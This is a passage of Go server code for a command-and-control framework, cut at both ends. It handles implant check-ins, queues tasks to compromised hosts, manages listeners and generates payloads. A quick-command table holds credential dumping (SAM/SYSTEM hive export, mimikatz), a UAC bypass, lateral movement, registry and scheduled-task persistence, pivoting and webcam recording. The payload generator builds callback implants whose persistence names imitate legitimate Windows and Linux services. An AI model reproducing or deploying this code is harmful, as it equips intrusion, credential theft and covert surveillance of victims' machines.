				updates["os"] = beaconOS
			}
			db.Model(&Client{}).Where("id = ?", authID).Updates(updates)
		}
	} else {
		// First poll after key binding: create a minimal record; registration
		// with full host info usually arrived first.
		basicCountry, basicCountryCode := lookupGeoIP(remoteIP)
		client = Client{
			ID:          authID,
			Name:        beaconNodeName(authID),
			IP:          remoteIP,
			Status:      "online",
			OS:          beaconOS,
			HomeNodeID:  localNodeID(),
			FirstSeen:   time.Now(),
			LastCheck:   time.Now(),
			Sleep:       60,
			Jitter:      10,
			Country:     basicCountry,
			CountryCode: basicCountryCode,
		}
		if err := db.Create(&client).Error; err != nil {
			addLog("ERR", "BEACON_CREATE_FAILED: "+err.Error())
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		addLog("C2", fmt.Sprintf("NEW_BEACON_REGISTERED: %s from %s [%s]", authID, remoteIP, basicCountryCode))

		event := map[string]interface{}{
			"type":      "new_beacon",
			"beacon_id": authID,
			"ip":        remoteIP,
			"os":        beaconOS,
		}
		eventJSON, _ := json.Marshal(event)
		broadcastWS(string(eventJSON))
		emitClusterEvent("beacon_update", client, "")
	}

	// Check for pending tasks
	pendingTasks, err := claimPendingTasks(authID)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	if len(pendingTasks) > 0 {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(pendingTasks)
		return
	}

	// No tasks - send sleep config
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(fmt.Sprintf("SLEEP %d %d", client.Sleep, client.Jitter)))
}

// handleLegacyBeaconCheckin serves the pre-HMAC wire protocol so payloads
// generated before the upgrade keep working:
//
//	POST: registration (CheckInData) or task result (TaskResultData)
//	GET:  poll via X-Beacon-ID header / ?id= query
func handleLegacyBeaconCheckin(w http.ResponseWriter, r *http.Request, remoteIP string) {
	if r.Method == http.MethodPost {
		r.Body = http.MaxBytesReader(w, r.Body, maxBeaconHTTPBody)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		r.Body.Close()

		var regData CheckInData
		if err := json.Unmarshal(body, &regData); err == nil && regData.BeaconID != "" && regData.Hostname != "" {
			addLog("SEC", "LEGACY_PROTOCOL: unsigned registration for "+regData.BeaconID)
			handleBeaconRegistration(w, r, regData)
			return
		}

		var result TaskResultData
		if err := json.Unmarshal(body, &result); err == nil && result.TaskID != "" {
			if strings.TrimSpace(result.BeaconID) == "" {
				w.WriteHeader(http.StatusBadRequest)
				return
			}
			completeTask(result.TaskID, result.BeaconID, result.Output)
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
		return
	}

	if r.Method != http.MethodGet {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	clientID := r.Header.Get("X-Beacon-ID")
	if clientID == "" {
		clientID = r.URL.Query().Get("id")
	}
	if clientID == "" {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	beaconPoll(w, clientID, remoteIP, parseBeaconOS(r))
}

// handleBeaconRegistration processes the enhanced registration JSON from a
// beacon. Callers must have authenticated the request (HMAC signature, or the
// legacy protocol when Settings.LegacyBeaconAuth is enabled).
func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data CheckInData) {
	var client Client
	result := db.First(&client, "id = ?", data.BeaconID)

	if result.Error == nil {
		// Update existing client info
		client.LastCheck = time.Now()
		client.Status = "online"
		client.Hostname = data.Hostname
		client.Username = data.Username
		client.Domain = data.Domain
		client.Arch = data.Arch
		client.PID = data.PID
		client.ProcessName = data.ProcessName
		client.IsAdmin = data.IsAdmin
		if data.InternalIP != "" {
			client.InternalIP = data.InternalIP
		}
		if data.OS != "" {
			client.OS = data.OS
		}
		if data.Sleep > 0 {
			client.Sleep = data.Sleep
		}
		if data.Jitter >= 0 {
			client.Jitter = data.Jitter
		}
		client.IP = extractIP(r.RemoteAddr)
		if client.HomeNodeID == "" {
			client.HomeNodeID = localNodeID()
		}
		if err := db.Save(&client).Error; err != nil {
			addLog("ERR", "BEACON_UPDATE_FAILED: "+err.Error())
		}
		emitClusterEvent("beacon_update", client, "")
	} else {
		// New registration
		name := data.Hostname
		if name == "" {
			name = beaconNodeName(data.BeaconID)
		}
		beaconSleep := data.Sleep
		if beaconSleep <= 0 {
			beaconSleep = 60
		}
		beaconJitter := data.Jitter
		if beaconJitter < 0 {
			beaconJitter = 10
		}
		clientIP := extractIP(r.RemoteAddr)
		country, countryCode := lookupGeoIP(clientIP)
		client = Client{
			ID:          data.BeaconID,
			Name:        name,
			IP:          clientIP,
			InternalIP:  data.InternalIP,
			Status:      "online",
			OS:          data.OS,
			Hostname:    data.Hostname,
			Username:    data.Username,
			Domain:      data.Domain,
			Arch:        data.Arch,
			PID:         data.PID,
			ProcessName: data.ProcessName,
			IsAdmin:     data.IsAdmin,
			HomeNodeID:  localNodeID(),
			FirstSeen:   time.Now(),
			LastCheck:   time.Now(),
			Sleep:       beaconSleep,
			Jitter:      beaconJitter,
			Country:     country,
			CountryCode: countryCode,
		}
		if err := db.Create(&client).Error; err != nil {
			addLog("ERR", "BEACON_CREATE_FAILED: "+err.Error())
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		addLog("C2", fmt.Sprintf("NEW_BEACON: %s@%s (%s) PID:%d [%s] [%s]",
			data.Username, data.Hostname, clientIP, data.PID, data.OS, countryCode))

		// Broadcast new beacon event
		event := map[string]interface{}{
			"type":      "new_beacon",
			"beacon_id": data.BeaconID,
			"hostname":  data.Hostname,
			"username":  data.Username,
			"ip":        extractIP(r.RemoteAddr),
			"os":        data.OS,
			"is_admin":  data.IsAdmin,
		}
		eventJSON, _ := json.Marshal(event)
		broadcastWS(string(eventJSON))
		emitClusterEvent("beacon_update", client, "")
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("REGISTERED"))
}

// ══════════════════════════════════════════════════════════
//  Log & Utility API
// ══════════════════════════════════════════════════════════

func handleGetLogs(c *gin.Context) {
	wsMutex.Lock()
	logsCopy := make([]string, len(logs))
	copy(logsCopy, logs)
	wsMutex.Unlock()
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: logsCopy})
}

func handleKillBeacon(c *gin.Context) {
	id := c.Param("id")
	var client Client
	if err := db.First(&client, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
		return
	}

	if _, err := createPendingTask(id, "__EXIT__"); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_KILL"})
		return
	}

	db.Model(&Client{}).Where("id = ?", id).Update("status", "offline")
	addLog("C2", fmt.Sprintf("KILL_SIGNAL_SENT: %s (%s@%s)", id, client.Username, client.Hostname))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "KILL_SENT"})
}

// handleUninstallBeacon disconnects the beacon and removes the payload from
// the target: the implant removes its persistence artifacts (registry run
// key / scheduled task / startup copy / cron / systemd / LaunchAgent),
// deletes its own binary and exits. Payloads built before this feature only
// support the plain kill (__EXIT__).
func handleUninstallBeacon(c *gin.Context) {
	id := c.Param("id")
	var client Client
	if err := db.First(&client, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
		return
	}

	if _, err := createPendingTask(id, "__UNINSTALL__"); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_UNINSTALL"})
		return
	}

	db.Model(&Client{}).Where("id = ?", id).Update("status", "offline")
	addLog("C2", fmt.Sprintf("UNINSTALL_SENT: %s (%s@%s) - persistence cleanup + self-delete ordered", id, client.Username, client.Hostname))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "UNINSTALL_SENT"})
}

func handleQuickCommand(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id" binding:"required"`
		Action   string `json:"action" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	cmdMap := map[string]string{
		"sysinfo":        "systeminfo",
		"avinfo":         "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /format:list",
		"procs":          "tasklist /v",
		"netstat":        "netstat -ano",
		"screenshot":     "__SCREENSHOT__",
		"hashdump":       "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM system.hiv",
		"mimikatz":       "__MIMIKATZ__",
		"uac_bypass":     "__UAC_BYPASS__",
		"token_steal":    "whoami /priv",
		"psexec":         "__PSEXEC__",
		"wmi_exec":       "__WMI_EXEC__",
		"port_scan":      "__PORTSCAN__",
		"reg_persist":    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v PrtsAgent /t REG_SZ /d C:\\ProgramData\\prts.exe /f",
		"task_persist":   "schtasks /create /sc minute /mo 30 /tn PrtsUpdate /tr C:\\ProgramData\\prts.exe /f",
		"uninstall":      "__UNINSTALL__",
		"wmi_persist":    "__WMI_PERSIST__",
		"socks5":         "__SOCKS5__",
		"port_fwd":       "__PORT_FORWARD__",
		"pivot":          "__PIVOT__",
		"ps_load":        "__PS_LOAD__",
		"reflective_dll": "__REFLECTIVE_DLL__",
		"cam_record":     "__CAM_RECORD__",
	}

	cmd, ok := cmdMap[req.Action]
	if !ok {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UNKNOWN_ACTION: " + req.Action})
		return
	}

	task, err := createPendingTask(req.ClientID, cmd)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_TASK"})
		return
	}
	addLog("TASK", fmt.Sprintf("QUICK_CMD[%s]: %s for %s", req.Action, cmd, req.ClientID))

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "TASK_QUEUED", Data: task})
}

// --- Listener Handlers ---

func handleCreateListener(c *gin.Context) {
	var req struct {
		Name   string `json:"name" binding:"required"`
		Type   string `json:"type" binding:"required"`
		BindIP string `json:"bind_ip" binding:"required"`
		Port   int    `json:"port" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	if req.Port < 1 || req.Port > 65535 {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_PORT"})
		return
	}
	if req.Type != "reverse_http" && req.Type != "reverse_tcp" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UNSUPPORTED_LISTENER_TYPE"})
		return
	}

	newID := "L-" + uuid.New().String()[:8]
	l := &Listener{
		ID:     newID,
		Name:   req.Name,
		Type:   req.Type,
		BindIP: req.BindIP,
		Port:   req.Port,
		Status: "stopped",
		NodeID: localNodeID(),
	}

	if err := db.Create(l).Error; err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "LISTENER_CREATE_FAILED"})
		return
	}

	if err := l.Start(); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("NET", fmt.Sprintf("NEW_LISTENER_STARTED: %s (%s:%d)", l.Name, l.BindIP, l.Port))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STARTED", Data: l})
}

func handleStartListener(c *gin.Context) {
	id := c.Param("id")
	var listener Listener
	if err := db.First(&listener, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "LISTENER_NOT_FOUND"})
		return
	}
	if listener.Status == "running" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "ALREADY_RUNNING"})
		return
	}
	// Cluster: listeners bind ports on their owning node only.
	if listener.NodeID != "" && listener.NodeID != localNodeID() {
		emitClusterEvent("listener_start", map[string]string{"listener_id": listener.ID}, listener.NodeID)
		addLog("CLUSTER", fmt.Sprintf("LISTENER_START_FORWARDED: %s -> node %s", listener.Name, listener.NodeID))
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_START_FORWARDED"})
		return
	}
	if err := listener.Start(); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	emitClusterEvent("listener_update", listener, "")
	addLog("NET", fmt.Sprintf("LISTENER_STARTED: %s", listener.Name))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STARTED", Data: listener})
}

func handleStopListener(c *gin.Context) {
	id := c.Param("id")

	var listener Listener
	if err := db.First(&listener, "id = ?", id).Error; err == nil && listener.NodeID != "" && listener.NodeID != localNodeID() {
		emitClusterEvent("listener_stop", map[string]string{"listener_id": listener.ID}, listener.NodeID)
		addLog("CLUSTER", fmt.Sprintf("LISTENER_STOP_FORWARDED: %s -> node %s", listener.Name, listener.NodeID))
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STOP_FORWARDED"})
		return

	}

	alMutex.Lock()
	l, exists := activeListeners[id]
	alMutex.Unlock()

	if !exists {
		db.Model(&Listener{}).Where("id = ?", id).Update("status", "stopped")
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STOPPED"})
		return
	}

	if err := l.Stop(); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	emitClusterEvent("listener_update", *l, "")
	addLog("NET", fmt.Sprintf("LISTENER_STOPPED: %s", l.Name))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_STOPPED"})
}

func handleDeleteListener(c *gin.Context) {
	id := c.Param("id")

	alMutex.Lock()
	l, exists := activeListeners[id]
	alMutex.Unlock()
	if exists {
		if err := l.Stop(); err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}
	}

	result := db.Delete(&Listener{}, "id = ?", id)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: result.Error.Error()})
		return
	}
	if result.RowsAffected > 0 {
		addLog("NET", "LISTENER_DELETED: "+id)
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "LISTENER_DELETED"})
		return
	}
	c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
}

// --- Client Handlers ---

func handleDeleteClient(c *gin.Context) {
	id := c.Param("id")
	result := db.Delete(&Client{}, "id = ?", id)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: result.Error.Error()})
		return
	}
	if result.RowsAffected > 0 {
		db.Where("client_id = ?", id).Delete(&Task{})
		addLog("C2", "CLIENT_REMOVED: "+id)
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "CLIENT_DELETED"})
		return
	}
	c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
}

func handleGetClientDetail(c *gin.Context) {
	id := c.Param("id")
	var client Client
	if err := db.First(&client, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
		return
	}

	// Count related data
	var taskCount int64
	db.Model(&Task{}).Where("client_id = ?", id).Count(&taskCount)

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"client":     client,
			"task_count": taskCount,
		},
	})
}

func handleUpdateClientNote(c *gin.Context) {
	id := c.Param("id")
	var req struct {
		Note  *string `json:"note"`
		Group *string `json:"group"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	updates := map[string]interface{}{}
	if req.Note != nil {
		updates["note"] = *req.Note
	}
	if req.Group != nil {
		updates["group"] = *req.Group
	}

	if len(updates) == 0 {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "NO_UPDATES"})
		return
	}
	result := db.Model(&Client{}).Where("id = ?", id).Updates(updates)
	if result.Error != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "UPDATE_FAILED"})
		return
	}
	if result.RowsAffected == 0 {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
		return
	}
	addLog("C2", fmt.Sprintf("CLIENT_UPDATED: %s", id))

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "UPDATED"})
}

// ── Stats ────────────────────────────────────────────────

func handleGetStats(c *gin.Context) {
	var beaconCount, listenerCount, taskCount, onlineCount int64
	var payloadCount int64
	db.Model(&Client{}).Count(&beaconCount)
	db.Model(&Client{}).Where("status = ?", "online").Count(&onlineCount)
	db.Model(&Listener{}).Count(&listenerCount)
	db.Model(&Task{}).Count(&taskCount)
	db.Model(&Payload{}).Count(&payloadCount)

	var pendingTasks, runningListeners int64
	db.Model(&Task{}).Where("status = ?", "pending").Count(&pendingTasks)
	db.Model(&Listener{}).Where("status = ?", "running").Count(&runningListeners)

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]int64{
			"beacons_total":     beaconCount,
			"beacons_online":    onlineCount,
			"listeners_total":   listenerCount,
			"listeners_running": runningListeners,
			"tasks_total":       taskCount,
			"tasks_pending":     pendingTasks,
			"payloads":          payloadCount,
		},
	})
}

// ══════════════════════════════════════════════════════════
//  Settings & Auth
// ══════════════════════════════════════════════════════════

func handleSaveSettings(c *gin.Context) {
	// Explicit DTO: binding the model would let the client set its own ID and
	// create extra settings rows.
	var req struct {
		ServerName       string `json:"server_name"`
		SessionTimeout   int    `json:"session_timeout"`
		Theme            string `json:"theme"`
		Debug            bool   `json:"debug"`
		GeoIPLookup      bool   `json:"geoip_lookup"`
		LegacyBeaconAuth bool   `json:"legacy_beacon_auth"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	if req.SessionTimeout < 1 || req.SessionTimeout > 720 {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_SESSION_TIMEOUT"})
		return
	}
	if len(req.ServerName) > 128 || len(req.Theme) > 64 {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_SETTINGS_VALUE"})
		return
	}

	var settings Settings
	if err := db.First(&settings).Error; err != nil {
		// If no settings exist, create new
		settings = Settings{
			ServerName:       req.ServerName,
			SessionTimeout:   req.SessionTimeout,
			Theme:            req.Theme,
			Debug:            req.Debug,
			GeoIPLookup:      req.GeoIPLookup,
			LegacyBeaconAuth: req.LegacyBeaconAuth,
		}
		if err := db.Create(&settings).Error; err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SETTINGS_SAVE_FAILED"})
			return
		}
	} else {
		// Update existing
		settings.ServerName = req.ServerName
		settings.SessionTimeout = req.SessionTimeout
		settings.Theme = req.Theme
		settings.Debug = req.Debug
		settings.GeoIPLookup = req.GeoIPLookup
		settings.LegacyBeaconAuth = req.LegacyBeaconAuth
		if err := db.Save(&settings).Error; err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SETTINGS_SAVE_FAILED"})
			return
		}
	}

	settingsMutex.Lock()
	GlobalSettings = settings
	settingsMutex.Unlock()

	addLog("SYS", fmt.Sprintf("SETTINGS_UPDATED: ServerName=%s Timeout=%dh Theme=%s Debug=%v",
		settings.ServerName, settings.SessionTimeout, settings.Theme, settings.Debug))

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "SETTINGS_SAVED"})
}

func handleGetSettings(c *gin.Context) {
	settingsMutex.RLock()
	settings := GlobalSettings
	settingsMutex.RUnlock()

	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: settings})
}

func handleChangePassword(c *gin.Context) {
	var req struct {
		OldPassword string `json:"old_password" binding:"required"`
		NewPassword string `json:"new_password" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	if len(req.NewPassword) < 12 {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PASSWORD_TOO_SHORT"})
		return
	}

	session := sessions.Default(c)
	username := session.Get("user")
	if username == nil {
		c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "NOT_LOGGED_IN"})
		return
	}

	var user User
	if err := db.Where("username = ?", username).First(&user).Error; err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "OLD_PASSWORD_INCORRECT"})
		return
	}
	if valid, _ := verifyPassword(user.Password, req.OldPassword); !valid {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "OLD_PASSWORD_INCORRECT"})
		return
	}

	passwordHash, hashErr := hashPassword(req.NewPassword)
	if hashErr != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "PASSWORD_HASH_FAILED"})
		return
	}
	user.Password = passwordHash
	if err := db.Save(&user).Error; err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "PASSWORD_UPDATE_FAILED"})
		return
	}

	addLog("SEC", fmt.Sprintf("PASSWORD_CHANGED: %s", username))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PASSWORD_CHANGED"})
}

// ══════════════════════════════════════════════════════════
//  Payload Handlers
// ══════════════════════════════════════════════════════════

func handleGetPayloads(c *gin.Context) {
	var list []Payload
	db.Order("created_at desc").Find(&list)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: list})
}

func handleDeletePayload(c *gin.Context) {
	id := c.Param("id")
	var payload Payload
	if err := db.First(&payload, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
		return
	}

	// Remove file. DownloadURL is server-generated ("/static/payloads/x.ext"),
	// but never os.Remove an unvalidated path.
	if payload.DownloadURL != "" {
		rel := strings.TrimPrefix(payload.DownloadURL, "/static/")
		rel = strings.TrimPrefix(rel, "/")
		rel = filepath.Clean(rel)
		if rel != "." && rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)) && !filepath.IsAbs(rel) {
			payloadsRoot, _ := filepath.Abs("./static/payloads")
			target := filepath.Join(payloadsRoot, rel)
			if target == payloadsRoot || strings.HasPrefix(target, payloadsRoot+string(filepath.Separator)) {
				os.Remove(target)
			}
		}
	}

	db.Delete(&Payload{}, "id = ?", id)
	addLog("GEN", "PAYLOAD_DELETED: "+id)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PAYLOAD_DELETED"})
}

// implantConfig is the complete runtime configuration injected into a payload.
// For Go implants it is written into implants/beacon_config.json via
// `go build -overlay` (never through the command line); for script payloads it
// is substituted into template placeholders after escaping.
type implantConfig struct {
	C2URL         string `json:"c2_url"`
	BeaconID      string `json:"beacon_id"`
	Sleep         int    `json:"sleep"`
	Jitter        int    `json:"jitter"`
	Proto         string `json:"proto"`
	AllowedIPs    string `json:"allowed_ips"` // pipe-separated IPs/CIDRs
	BlockedIPs    string `json:"blocked_ips"` // pipe-separated IPs/CIDRs
	BeaconKey     string `json:"beacon_key"`  // per-payload HMAC key (hex)
	PersistMethod string `json:"persist_method"`
	PersistName   string `json:"persist_name"`
}

// persistMethodsForOS lists the accepted persistence method values.
func persistMethodsForOS(goos string) []string {
	switch goos {
	case "windows":
		return []string{"", "auto", "run", "startup", "schtasks", "none"}
	case "darwin":
		return []string{"", "auto", "launchagent", "none"}
	default:
		return []string{"", "auto", "cron", "systemd", "profile", "none"}
	}
}

// validateIPFilterList verifies every pipe/comma separated entry is an IP or CIDR.
func validateIPFilterList(entries string) bool {
	if strings.TrimSpace(entries) == "" {
		return true
	}
	for _, entry := range strings.Split(entries, "|") {
		entry = strings.TrimSpace(entry)
		if entry == "" {
			continue
		}
		if strings.Contains(entry, "/") {
			if _, _, err := net.ParseCIDR(entry); err != nil {
				return false
			}
		} else if net.ParseIP(entry) == nil {
			return false
		}
	}
	return true
}

func handleGeneratePayload(c *gin.Context) {
	var req struct {
		Name          string `json:"name" binding:"required"`
		Type          string `json:"type" binding:"required"`
		ListenerID    string `json:"listener_id" binding:"required"`
		CallbackHost  string `json:"callback_host" binding:"required"`
		CallbackPort  int    `json:"callback_port"`
		OS            string `json:"os"`
		Arch          string `json:"arch"`
		Sleep         int    `json:"sleep"`
		Jitter        *int   `json:"jitter"`
		AllowedIPs    string `json:"allowed_ips"`
		BlockedIPs    string `json:"blocked_ips"`
		PersistMethod string `json:"persist_method"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var listener Listener
	if err := db.First(&listener, "id = ?", req.ListenerID).Error; err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "LISTENER_NOT_FOUND"})
		return
	}

	// Callback host: the IP/domain the beacon connects back to
	// Callback port: override port (for NAT/redirect), defaults to listener port
	c2Host := req.CallbackHost
	c2Port := req.CallbackPort
	if c2Port <= 0 {
		c2Port = listener.Port
	}
	if c2Port < 1 || c2Port > 65535 {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_CALLBACK_PORT"})
		return
	}

	proto := "http"
	c2URL := fmt.Sprintf("http://%s:%d", c2Host, c2Port)
	if listener.Type == "reverse_tcp" {
		proto = "tcp"
		c2URL = fmt.Sprintf("%s:%d", c2Host, c2Port)
	}

	sleepVal := req.Sleep
	if sleepVal <= 0 {
		sleepVal = 60
	}
	jitterVal := 10
	if req.Jitter != nil {
		jitterVal = *req.Jitter
	}
	if jitterVal < 0 || jitterVal > 100 {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_JITTER"})
		return
	}
	if sleepVal < 1 || sleepVal > 86400 {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_SLEEP"})
		return
	}

	if req.OS == "" {
		req.OS = "windows"
	}
	if req.Arch == "" {
		req.Arch = "amd64"
	}
	if req.OS != "windows" && req.OS != "linux" && req.OS != "darwin" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_OS"})
		return
	}

	// Force OS for platform-specific types
	switch req.Type {
	case "powershell":
		req.OS = "windows"
	case "bash":
		req.OS = "linux"
	}

	// Validate IP filter input before it reaches any template or build config.
	allowedIPs := strings.ReplaceAll(strings.TrimSpace(req.AllowedIPs), ",", "|")
	blockedIPs := strings.ReplaceAll(strings.TrimSpace(req.BlockedIPs), ",", "|")
	if !validateIPFilterList(allowedIPs) || !validateIPFilterList(blockedIPs) {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_IP_FILTER"})
		return
	}

	// Persistence method (Go implants only; scripts are short-lived by design)
	persistMethod := strings.TrimSpace(req.PersistMethod)
	validPersist := false
	for _, m := range persistMethodsForOS(req.OS) {
		if persistMethod == m {
			validPersist = true
			break
		}
	}
	if !validPersist {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_PERSIST_METHOD"})
		return
	}

	newID := "P-" + uuid.New().String()[:8]
	beaconID := uuid.New().String()
	beaconKey := randomHexKey(32)

	// Randomize the persistence artifact name per payload (platform-appropriate)
	persistKey := ""
	if persistMethod != "none" {
		if req.OS == "windows" {
			persistNames := []string{
				"WindowsUpdateSvc", "SecurityHealthSystray", "OneDriveSync",
				"MicrosoftEdgeUpdate", "WindowsDefenderTask", "RuntimeBroker",
				"BackgroundTaskHost", "SearchIndexer", "WinStoreApp",
				"SystemSettings", "DesktopWindowMgr", "AppHostSvc",
			}
			persistKey = persistNames[time.Now().UnixNano()%int64(len(persistNames))]
		} else {
			unixNames := []string{
				"user-dirs-update", "spice-vdagent", "gvfs-udisks2",
				"gnome-keyring-seed", "at-spi-registry", "dbus-user-session",
			}
			persistKey = unixNames[time.Now().UnixNano()%int64(len(unixNames))]
		}
	}

	cfg := implantConfig{
		C2URL:         c2URL,
		BeaconID:      beaconID,
		Sleep:         sleepVal,
		Jitter:        jitterVal,
		Proto:         proto,
		AllowedIPs:    allowedIPs,
		BlockedIPs:    blockedIPs,
		BeaconKey:     beaconKey,
		PersistMethod: persistMethod,
		PersistName:   persistKey,
	}

	// Determine file extension
	ext := ""
	switch req.Type {
	case "executable":
		if req.OS == "linux" {
			ext = "elf"
		} else {
			ext = "exe"
		}
	case "powershell":
		ext = "ps1"
	case "shellcode_bin":
		ext = "bin"
	case "shellcode_raw":
		ext = "raw"
	case "python":
		ext = "py"
	case "bash":
		ext = "sh"
	case "shellcode_c":
		ext = "c"
	case "shellcode_csharp":
		ext = "cs"
	case "shellcode_go":
		ext = "go"
	default:
		ext = "bin"
	}

	dstDir := "./static/payloads"
	if err := os.MkdirAll(dstDir, 0755); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "PAYLOAD_DIR_FAILED"})
		return
	}
	dstFile := filepath.Join(dstDir, fmt.Sprintf("%s.%s", newID, ext))

	// --- Generate payload based on type ---
	switch req.Type {

	case "powershell":
		if proto == "tcp" {
			c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PowerShell stager does not support TCP protocol. Use HTTP listener."})
			return
		}
		if err := generateFromTemplate("implants/beacon.ps1", dstFile, cfg); err != nil {
			addLog("ERR", "PS1_GEN_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}

	case "python":
		if err := generateFromTemplate("implants/beacon.py", dstFile, cfg); err != nil {
			addLog("ERR", "PYTHON_GEN_FAILED: "+err.Error())
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}

	case "bash":
		// Bash payloads generate a fresh ID at process startup. Reusing a
